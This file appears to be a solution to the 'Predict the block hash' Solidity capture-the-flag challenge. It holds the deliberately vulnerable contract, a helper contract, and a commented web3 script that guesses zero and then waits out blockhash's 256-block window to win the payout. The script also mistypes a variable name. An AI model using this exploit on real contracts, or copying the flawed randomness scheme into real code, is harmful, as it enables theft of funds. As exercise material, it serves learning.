pragma solidity ^0.4.21;

/*
const oneEth = web3.utils.toWei('1', 'ether');
var predictTheBlockHashChallenge = await PredictTheBlockHashChallenge.deployed();
var predictHashHelper = await PredictHashHelper.deployed();

var blockNumTarget = await web3.eth.getBlockNumber() + 260;
var answer = await predictHashHelper.getAnswer(blockNumTarget);
await predictTheBlockHashChallenge.lockInGuess(answer, {from: accounts[0], value: oneEth});
var blockNumCurrent = await web3.eth.getBlockNumber();
while (blockNumCurrent < blockNumberTarget) {
    await predictHashHelper.wasteBlock();
    blockNumCurrent = await web3.eth.getBlockNumber();
}
await predictTheBlockHashChallenge.settle();
await predictTheBlockHashChallenge.isComplete();
*/

contract PredictHashHelper {
    uint8 waste;
    address otherContract;

    function PredictHashHelper() public {
        otherContract = 0;  // changed during deployment
    }

    function setOtherContract(address newAddr) public {
        otherContract = newAddr;
    }

    function getOtherContract() public view returns (address) {
        return otherContract;
    }

    function getAnswer(uint256 blockNum) public view returns (bytes32) {
        return block.blockhash(blockNum);
    }

    function wasteBlock() public {
        waste += 1;
    }

    function() public payable { 
    }

    function isComplete() public view returns (bool) {
        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
        return predictTheBlockHashChallenge.isComplete();
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function lockInGuess(bytes32 hash) public payable {
        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
        predictTheBlockHashChallenge.lockInGuess.value(1 ether)(hash);
    }    

    function settle() public {
        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
        predictTheBlockHashChallenge.settle();
    }
}

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
